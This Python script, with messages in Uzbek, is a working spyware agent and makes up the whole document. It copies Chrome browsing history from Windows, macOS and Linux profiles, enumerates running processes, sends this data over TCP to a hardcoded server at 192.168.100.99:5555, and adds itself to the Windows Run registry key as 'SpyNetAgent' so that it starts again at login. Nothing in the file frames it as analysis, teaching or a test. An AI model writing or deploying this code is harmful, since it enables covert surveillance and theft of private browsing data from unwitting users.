import socket
import json
import os
import sys
import sqlite3
import shutil
import getpass
import psutil
from datetime import datetime

SERVER_IP = "192.168.100.99"
SERVER_PORT = 5555
LOG_FILE = "system_log.txt"


def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "platform": sys.platform,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "websites": [],
        "processes": []
    }

    profile_paths = []

    if sys.platform == "win32":
        username = os.environ.get('USERNAME') or getpass.getuser()
        base_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data"
        if os.path.exists(base_path):
            profiles = ["Default", "Profile 1"]
            for p in profiles:
                path = os.path.join(base_path, p, "History")
                if os.path.exists(path):
                    profile_paths.append(path)

    elif sys.platform == "darwin":
        username = getpass.getuser()
        base_path = f"/Users/{username}/Library/Application Support/Google/Chrome"
        profiles = ["Default", "Profile 1"]
        for p in profiles:
            path = os.path.join(base_path, p, "History")
            if os.path.exists(path):
                profile_paths.append(path)

    elif sys.platform == "linux":
        username = getpass.getuser()
        paths = [
            f"/home/{username}/.config/google-chrome/Default/History",
            f"/data/data/com.termux/files/home/.cache/chrome/Default/History"
        ]
        for path in paths:
            if os.path.exists(path):
                profile_paths.append(path)

    # Tarix fayllarini o'qish
    for history_path in profile_paths:
        try:
            temp_db = "chrome_temp.db"
            shutil.copy2(history_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
            results = cursor.fetchall()

            for row in results:
                info["websites"].append({
                    "url": row[0],
                    "title": row[1] or "Sarlavhasiz"
                })

            conn.close()
            os.remove(temp_db)
            break

        except Exception as e:
            print(f"Tarix xatosi: {e}")

    try:
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
            try:
                pinfo = proc.info
                mem_mb = round(pinfo['memory_info'].rss / 1024 / 1024, 2) if pinfo['memory_info'] else 0

                info["processes"].append({
                    "pid": pinfo['pid'],
                    "name": pinfo['name'],
                    "cpu": pinfo['cpu_percent'],
                    "ram_mb": mem_mb
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception as e:
        print(f" xato: {e}")

    return info


def send_to_server(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((SERVER_IP, SERVER_PORT))

            json_data = json.dumps(data).encode('utf-8')
            s.sendall(json_data)

            print(f"yuborildi ({len(json_data)} bayt)")

    except Exception as e:
        print(f"xatolik: {e}")


def auto_start_windows():
    if sys.platform == "win32":
        import winreg as reg

        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        app_name = "SpyNetAgent"

        try:
            exe_path = sys.executable

            key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, app_name, 0, reg.REG_SZ, exe_path)
            reg.CloseKey(key)
            print("avtosyart")
        except Exception as e:
            print(f"Avto-start xatosi: {e}")


if __name__ == "__main__":
    print("collecting")

    auto_start_windows()

    data = get_system_info()

    send_to_server(data)

    print("done")